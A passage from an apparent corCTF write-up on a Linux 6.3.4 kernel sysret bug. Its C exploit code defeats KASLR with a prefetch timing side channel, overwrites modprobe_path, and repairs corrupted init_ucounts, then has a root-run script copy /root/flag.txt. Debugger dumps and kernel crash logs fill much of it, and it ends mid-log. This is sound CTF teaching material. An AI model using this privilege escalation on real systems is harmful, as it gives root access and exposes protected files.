<span class="kt">uint64_t</span> <span class="nf">prefetch</span><span class="p">(</span><span class="kt">int</span> <span class="n">phys</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">arr_size</span> <span class="o">=</span> <span class="n">ARR_SIZE_KERNEL</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">scan_start</span> <span class="o">=</span> <span class="n">SCAN_START_KERNEL</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">step_size</span> <span class="o">=</span> <span class="n">STEP_KERNEL</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">phys</span><span class="p">)</span> <span class="p">{</span>
	    <span class="n">arr_size</span> <span class="o">=</span> <span class="n">ARR_SIZE_PHYS</span><span class="p">;</span>
	    <span class="n">scan_start</span> <span class="o">=</span> <span class="n">SCAN_START_PHYS</span><span class="p">;</span>
	    <span class="n">step_size</span> <span class="o">=</span> <span class="n">STEP_PHYS</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">arr_size</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">arr_size</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">));</span>

    <span class="kt">uint64_t</span> <span class="n">min</span> <span class="o">=</span> <span class="o">~</span><span class="mi">0</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="o">~</span><span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ITERATIONS</span> <span class="o">+</span> <span class="n">DUMMY_ITERATIONS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="n">arr_size</span><span class="p">;</span> <span class="n">idx</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="kt">uint64_t</span> <span class="n">test</span> <span class="o">=</span> <span class="n">scan_start</span> <span class="o">+</span> <span class="n">idx</span> <span class="o">*</span> <span class="n">step_size</span><span class="p">;</span>
            <span class="n">syscall</span><span class="p">(</span><span class="mi">104</span><span class="p">);</span>
            <span class="kt">uint64_t</span> <span class="n">time</span> <span class="o">=</span> <span class="n">sidechannel</span><span class="p">(</span><span class="n">test</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="n">DUMMY_ITERATIONS</span><span class="p">)</span>
                <span class="n">data</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">+=</span> <span class="n">time</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">arr_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">/=</span> <span class="n">ITERATIONS</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">min</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">min</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">scan_start</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="n">step_size</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>

    <span class="kt">uint64_t</span> <span class="n">kaslr</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc00000</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">phys</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100000000</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"KERNEL base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kaslr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"PHYS base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">phys</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>And boom! KASLR in shambles!</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@corctf:~<span class="nv">$ </span>/tmp/exploit
KASLR base ffffffffb5c00000
PHYS base ffff8d9000000000
</code></pre></div></div>

<h2 id="escalating-privileges">escalating privileges</h2>

<p>With KASLR broken I could set gsbsase to its original value before which gave me a fairly stable way to trigger the sysret bug and survive.</p>

<p>So now the goal is to use the memory corruption from the <code class="language-plaintext highlighter-rouge">error_entry</code> function I mentioned previously to corrupt some kernel memory with controlled values. I figured that the easiest target would be overwriting <code class="language-plaintext highlighter-rouge">modprobe_path</code>, a great description of this techinque can be found <a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">here</a>. Basically overwriting this kernel variable with a path to a file I control the contents of will lead to it being executed as root when a file with an unrecognized header is executed.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>

    <span class="n">kaslr</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc00000</span><span class="p">;</span>
    <span class="n">phys</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100000000</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"KASLR base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kaslr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"PHYS base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">phys</span><span class="p">);</span>

    <span class="n">gsbase</span> <span class="o">=</span> <span class="n">phys</span> <span class="o">+</span> <span class="mh">0x13bc00000</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"gsbase: %#lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">gsbase</span><span class="p">);</span>

    <span class="c1">// create trigger file for modprobe</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne </span><span class="se">\"\xff\xff\xff\xff\"</span><span class="s"> &gt;&gt; /tmp/bad"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod 777 /tmp/bad"</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kaslr</span> <span class="o">+</span> <span class="mh">0x103b840</span><span class="p">;</span>

    <span class="c1">// fill registers with new modprobe path</span>
    <span class="kt">uint64_t</span> <span class="n">new_modprobe</span> <span class="o">=</span> <span class="mh">0x0000612f706d742f</span><span class="p">;</span> <span class="c1">// /tmp/a</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">regs</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">new_modprobe</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	    <span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">regs</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_modprobe</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// position register dump over modprobe_path</span>
    <span class="n">do_sysret</span><span class="p">(</span><span class="n">modprobe_path</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>I setup the ptrace registers to be filled with the bytes b”/tmp/a\0\0” to overwrite the default <code class="language-plaintext highlighter-rouge">modprobe_path</code> and triggered the sysret bug with a stack pointer that cause the registers are pushed on top of the <code class="language-plaintext highlighter-rouge">modprobe_path</code> variable.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/20gx &amp;modprobe_path
0xffffffff8203b840 &lt;modprobe_path&gt;:     0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b850 &lt;modprobe_path+16&gt;:  0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b860 &lt;modprobe_path+32&gt;:  0x0000612f706d742f      0x0000000000000246
0xffffffff8203b870 &lt;modprobe_path+48&gt;:  0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b880 &lt;modprobe_path+64&gt;:  0x0000612f706d742f      0x0000000000000052
0xffffffff8203b890 &lt;modprobe_path+80&gt;:  0x8000000000000000      0x0000612f706d742f
0xffffffff8203b8a0 &lt;modprobe_path+96&gt;:  0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b8b0 &lt;modprobe_path+112&gt;: 0xffffffffffffffff      0xffffffff81a00191
0xffffffff8203b8c0 &lt;modprobe_path+128&gt;: 0x0000000000000010      0x0000000000010046
0xffffffff8203b8d0 &lt;modprobe_path+144&gt;: 0xffffffff8203b8e8      0x0000000000000018
gef➤  x/s &amp;modprobe_path
0xffffffff8203b840 &lt;modprobe_path&gt;:     "/tmp/a"
</code></pre></div></div>

<p>Incredibly, nothing crashed… yet…</p>

<p>I had created a file at /tmp/a to be executed when I ran the trigger file with a bad header, but when I executed it a page fault occurred and prevented the file at the hijacked modprobe path from being executed…</p>

<p>It turns out I had corrupted more than just modprobe path… at this point I tried a bunch of different offsets of the <code class="language-plaintext highlighter-rouge">modprobe_path</code> variable hoping one of them might ‘just work’ but had no such luck, I even gave up on <code class="language-plaintext highlighter-rouge">modprobe_path</code> at one point and started exploring hijacking <code class="language-plaintext highlighter-rouge">core_pattern</code> and even seeing if I could safely corrupt a cred struct. None of those ended up working out, for a brief second I considered that maybe I should stop being lazy and just rop. But then I had another idea, what if I could just fix the corruption… with more corruption?</p>

<p>Lets take a closer at what was going wrong when I tried to corrupt <code class="language-plaintext highlighter-rouge">modprobe_path</code>.</p>

<p>This is the trace the kernel prints when I tried to trigger modprobe:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[    5.095502] BUG: unable to handle page fault for address: ffffffff00000208
[    5.096822] #PF: supervisor read access in kernel mode
[    5.098019] #PF: error_code(0x0000) - not-present page
[    5.098661] PGD 202e067 P4D 202e067 PUD 0
[    5.099171] Oops: 0000 [#2] PREEMPT SMP NOPTI
[    5.099704] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
[    5.100631] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.16.2-1-1 04/014
[    5.101765] Workqueue: events_unbound call_usermodehelper_exec_work
[    5.102522] RIP: 0010:inc_rlimit_ucounts+0x31/0x70
[    5.103129] Code: f0 48 89 f9 45 31 d2 49 b9 ff ff ff ff ff ff ff 7f 4a 8d 34 c5 70 00 00 00 49 83 8
[    5.105340] RSP: 0018:ffffc900000e3cb8 EFLAGS: 00010282
[    5.105977] RAX: ffffffff00000028 RBX: ffff888100964ec0 RCX: ffffffff8203b6c0
[    5.106850] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
[    5.107914] RBP: ffffffff8203b6c0 R08: 0000000000000046 R09: 7fffffffffffffff
[    5.108776] R10: 7fffffffffffffff R11: 0000000000000025 R12: 0000000000000000
[    5.110192] R13: ffffc900000e3df0 R14: 00000000ffffffff R15: 0000000000800100
[    5.111701] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[    5.112934] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.113974] CR2: ffffffff00000208 CR3: 0000000100ad2002 CR4: 0000000000370ef0
[    5.115356] Call Trace:
[    5.115679]  &lt;TASK&gt;
[    5.115953]  copy_creds+0xb8/0x160
[    5.116388]  copy_process+0x3c6/0x19b0
[    5.116860]  kernel_clone+0x96/0x350
[    5.117313]  ? update_load_avg+0x5f/0x610
[    5.117814]  ? update_load_avg+0x5f/0x610
[    5.118316]  user_mode_thread+0x56/0x80
[    5.118788]  ? __pfx_call_usermodehelper_exec_async+0x10/0x10
[    5.119512]  call_usermodehelper_exec_work+0x2a/0x80
[    5.120120]  process_one_work+0x1b1/0x340
[    5.120616]  worker_thread+0x45/0x3b0
[    5.121063]  ? __pfx_worker_thread+0x10/0x10
[    5.121603]  kthread+0xd1/0x100
[    5.121996]  ? __pfx_kthread+0x10/0x10
[    5.122464]  ret_from_fork+0x29/0x50
[    5.122923]  &lt;/TASK&gt;
</code></pre></div></div>

<p>It crashed somewhere in <code class="language-plaintext highlighter-rouge">inc_rlimit_ucounts</code>, I had no clue why so I set a breakpoint at it, restarted the vm, and ran tried to trigger the bug again.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffffff8109e9b1 in inc_rlimit_ucounts ()
   0xffffffff8109e9a6 &lt;inc_rlimit_ucounts+38&gt; cmp    rdi, rcx
   0xffffffff8109e9a9 &lt;inc_rlimit_ucounts+41&gt; cmove  r10, rax
   0xffffffff8109e9ad &lt;inc_rlimit_ucounts+45&gt; mov    rax, QWORD PTR [rcx+0x10]
 → 0xffffffff8109e9b1 &lt;inc_rlimit_ucounts+49&gt; mov    rcx, QWORD PTR [rax+0x1e0]
   0xffffffff8109e9b8 &lt;inc_rlimit_ucounts+56&gt; mov    r9, QWORD PTR [rax+r8*8+0x8]
   0xffffffff8109e9bd &lt;inc_rlimit_ucounts+61&gt; test   rcx, rcx
   0xffffffff8109e9c0 &lt;inc_rlimit_ucounts+64&gt; je     0xffffffff8109e9e4 &lt;inc_rlimit_ucounts+100&gt;
   0xffffffff8109e9c2 &lt;inc_rlimit_ucounts+66&gt; mov    rax, rdx
   0xffffffff8109e9c5 &lt;inc_rlimit_ucounts+69&gt; ds     xadd QWORD PTR [rcx+rsi*1], rax
</code></pre></div></div>

<p>This instruction is what crashes, it is dereferencing some value it got from the address in rcx, so what is rcx?</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/20gx $rcx
0xffffffff8203b6c0 &lt;init_ucounts&gt;:      0x0000000000000000      0xffffffff810c50b3
0xffffffff8203b6d0 &lt;init_ucounts+16&gt;:   0xffffffff00000028      0x000000008203b730
0xffffffff8203b6e0 &lt;init_ucounts+32&gt;:   0xffffffff8203b6f0      0x18581c54482e2a00
0xffffffff8203b6f0 &lt;init_ucounts+48&gt;:   0x18581c54482e2a00      0xffffffff81e99724
0xffffffff8203b700 &lt;init_ucounts+64&gt;:   0x00007fffade979fc      0x0000000100ad0001
0xffffffff8203b710 &lt;init_ucounts+80&gt;:   0x0000000000370ef0      0xffffffff8203b5f0
0xffffffff8203b720 &lt;init_ucounts+96&gt;:   0xffffffff81e99724      0xffffffff81024f2d
0xffffffff8203b730 &lt;init_ucounts+112&gt;:  0xffff88813bc00001      0x000000000000016e
0xffffffff8203b740 &lt;init_ucounts+128&gt;:  0x0000000080050033      0x0000000000000046
</code></pre></div></div>

<p>Looks like rcx is the address of <code class="language-plaintext highlighter-rouge">init_ucounts</code> I don’t really know what this is for, but I see a user space stack address in there so I’m guessing I accidentally corrupted this…</p>

<p>And it is right up against <code class="language-plaintext highlighter-rouge">modprobe_path</code>, so definitely my fault.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  p/x (void*)&amp;modprobe_path - (void*)&amp;init_ucounts
$17 = 0x180
</code></pre></div></div>

<p>So I figured what I could just use more corruption by triggering the sysret bug again to uncorrupt <code class="language-plaintext highlighter-rouge">init_ucounts</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; x/20gx &amp;init_ucounts
0xffffffff8203b6c0 &lt;init_ucounts&gt;:      0xffff888100049600	0xffffffff82640160
0xffffffff8203b6d0 &lt;init_ucounts+16&gt;:	0xffffffff8203a320	0x0000002f00000000
0xffffffff8203b6e0 &lt;init_ucounts+32&gt;:	0x0000000000000000	0x0000000000000000
0xffffffff8203b6f0 &lt;init_ucounts+48&gt;:	0x0000000000000000	0x0000000000000000
0xffffffff8203b700 &lt;init_ucounts+64&gt;:	0x0000000000000000	0x0000000000000000
0xffffffff8203b710 &lt;init_ucounts+80&gt;:	0x0000000000000000	0x0000000000000000
0xffffffff8203b720 &lt;init_ucounts+96&gt;:	0x0000000000000000	0x0000000000000000
0xffffffff8203b730 &lt;init_ucounts+112&gt;:	0x000000000000002a	0x0000000000000000
0xffffffff8203b740 &lt;init_ucounts+128&gt;:	0x0000000000000000	0x0000000000000000
</code></pre></div></div>

<p>Above is what <code class="language-plaintext highlighter-rouge">init_ucounts</code> looks like just after boot, I just had to make it look somewhat like that again hopefully the faults would just go away.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
    <span class="c1">// fixup corrupted init_ucounts</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rbp</span> <span class="o">=</span> <span class="mh">0x0000002d00000000</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">r12</span> <span class="o">=</span> <span class="n">kaslr</span> <span class="o">+</span> <span class="mh">0x103a320</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">r13</span> <span class="o">=</span> <span class="n">kaslr</span> <span class="o">+</span> <span class="mh">0x1640160</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">r14</span> <span class="o">=</span> <span class="n">phys</span> <span class="o">+</span> <span class="mh">0x100049600</span><span class="p">;</span>

    <span class="c1">// position register dump over init_ucounts</span>
    <span class="n">do_sysret</span><span class="p">(</span><span class="n">modprobe_path</span><span class="o">-</span><span class="mh">0xd8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
<span class="p">...</span>
</code></pre></div></div>

<p>I set up the regisers for ptrace so that the four qwords that are actually set would be set back to their initial values, and gave it a go:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; x/20gx &amp;init_ucounts
0xffffffff8203b6c0 &lt;init_ucounts&gt;:      0xffff888100049600      0xffffffff82640160
0xffffffff8203b6d0 &lt;init_ucounts+16&gt;:   0xffffffff8203a320      0x0000002e00000000
0xffffffff8203b6e0 &lt;init_ucounts+32&gt;:   0x0000612f706d742f      0x0000000000000246
0xffffffff8203b6f0 &lt;init_ucounts+48&gt;:   0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b700 &lt;init_ucounts+64&gt;:   0x0000612f706d742f      0x0000000000000054
0xffffffff8203b710 &lt;init_ucounts+80&gt;:   0x8000000000000000      0x0000612f706d742f
0xffffffff8203b720 &lt;init_ucounts+96&gt;:   0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b730 &lt;init_ucounts+112&gt;:  0xffffffffffffffff      0xffffffff81a00191
0xffffffff8203b740 &lt;init_ucounts+128&gt;:  0x0000000000000010      0x0000000000010046
</code></pre></div></div>

<p>Well, it looks horrible but maybe it is close enough? hopefully?</p>

<p>So I tried triggering my hijacked <code class="language-plaintext highlighter-rouge">modprobe_path</code> again, and…</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@corctf:~$ /sysret
KASLR base ffffffff81000000
PHYS base ffff888000000000
gsbase: 0xffff88813bc00000
[    5.115530] general protection fault, maybe for address 0x51: 0000 [#1] PREEMPT SMP NOPTI
...
[    5.150788] general protection fault, maybe for address 0x53: 0000 [#2] PREEMPT SMP NOPTI
...
ctf@corctf:~$ /tmp/bad
/tmp/bad: line 1: : not found
</code></pre></div></div>

<p>I… didn’t crash? It actually worked!?!</p>

<p>I went ahead and added a few more lines to my exploit to automatically create /tmp/a which will copy the flag to /tmp where I can read it.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// called by modprobe</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne </span><span class="se">\"</span><span class="s">#!/bin/sh</span><span class="se">\n</span><span class="s">cp /root/flag.txt /tmp/heckyeah</span><span class="se">\n</span><span class="s">chown ctf:ctf /tmp/heckyeah</span><span class="se">\"</span><span class="s"> &gt; /tmp/a"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod 777 /tmp/a"</span><span class="p">);</span>

    <span class="p">...</span>

    <span class="c1">// trigger modprobe</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/tmp/bad"</span><span class="p">);</span>

    <span class="c1">// get flag</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /tmp/heckyeah"</span><span class="p">);</span>
<span class="err">}</span>
</code></pre></div></div>

<p>I tried running this locally and was able to the get the test flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@corctf:~$ /sysret
KASLR base ffffffff81000000
PHYS base ffff888000000000
gsbase: 0xffff88813bc00000
...
/tmp/bad: line 1: : not found
corctf{test_flag}
ctf@corctf:~$
</code></pre></div></div>

<p>Now to try it on remote!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@corctf:~$ chmod +x /tmp/exploit
ctf@corctf:~$ /tmp/exploit
KASLR base ffffffffb5c00000
PHYS base ffff8d9000000000
gsbase: 0xffff8d913bc00000
[   93.372874] general protection fault, maybe for address 0x54: 0000 [#1] PREEMPT SMP NOPTI
[   93.373374] CPU: 0 PID: 83 Comm: exploit Not tainted 6.3.4 #14
[   93.373717] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   93.374277] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.374601] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 &lt;48&gt; 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.375677] RSP: 0018:ffffffffb6c3b8e8 EFLAGS: 00010046
[   93.375988] RAX: 0000000000000054 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.376409] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.376825] RBP: 0000612f706d742f R08: 0000612f706d742f R09: 0000612f706d742f
[   93.377248] R10: 0000612f706d742f R11: 0000000000000246 R12: 0000612f706d742f
[   93.377666] R13: 0000612f706d742f R14: 0000612f706d742f R15: 0000612f706d742f
[   93.378081] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.378552] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.378881] CR2: 00007ffc8370b858 CR3: 0000000100ac4004 CR4: 0000000000770ef0
[   93.379292] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.379712] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.380129] PKRU: 55555554
[   93.380290] Call Trace:
[   93.380438] Modules linked in:
[   93.380625] ---[ end trace 0000000000000000 ]---
[   93.380897] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.381212] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 &lt;48&gt; 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.382302] RSP: 0018:ffffffffb6c3b8e8 EFLAGS: 00010046
[   93.382606] RAX: 0000000000000054 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.383027] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.383444] RBP: 0000612f706d742f R08: 0000612f706d742f R09: 0000612f706d742f
[   93.383857] R10: 0000612f706d742f R11: 0000000000000246 R12: 0000612f706d742f
[   93.384274] R13: 0000612f706d742f R14: 0000612f706d742f R15: 0000612f706d742f
[   93.384689] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.385154] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.385496] CR2: 00007ffc8370b858 CR3: 0000000100ac4004 CR4: 0000000000770ef0
[   93.385915] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.386333] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.386745] PKRU: 55555554
[   93.386907] note: exploit[83] exited with irqs disabled
[   93.387268] general protection fault
[   93.387485] general protection fault, maybe for address 0x56: 0000 [#2] PREEMPT SMP NOPTI
[   93.387958] CPU: 0 PID: 85 Comm: exploit Tainted: G      D            6.3.4 #14
[   93.388394] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   93.388947] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.389256] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 &lt;48&gt; 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.390325] RSP: 0018:ffffffffb6c3b768 EFLAGS: 00010046
[   93.390633] RAX: 0000000000000056 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.391053] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.391468] RBP: 0000002d00000000 R08: 0000612f706d742f R09: 0000612f706d742f
[   93.391879] R10: 0000612f706d742f R11: 0000000000000246 R12: ffffffffb6c3a320
[   93.392302] R13: ffffffffb7240160 R14: ffff8d9100049600 R15: 0000612f706d742f
[   93.392718] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.393176] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.393515] CR2: 00007ffc83709fe4 CR3: 0000000100ac8005 CR4: 0000000000770ef0
[   93.393932] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.394347] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.394757] PKRU: 55555554
[   93.394919] Call Trace:
[   93.395065] Modules linked in:
[   93.395247] ---[ end trace 0000000000000000 ]---
[   93.395512] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.395824] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 &lt;48&gt; 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.396906] RSP: 0018:ffffffffb6c3b8e8 EFLAGS: 00010046
[   93.397208] RAX: 0000000000000054 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.397619] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.398028] RBP: 0000612f706d742f R08: 0000612f706d742f R09: 0000612f706d742f
[   93.398434] R10: 0000612f706d742f R11: 0000000000000246 R12: 0000612f706d742f
[   93.398840] R13: 0000612f706d742f R14: 0000612f706d742f R15: 0000612f706d742f
[   93.399251] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.399717] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
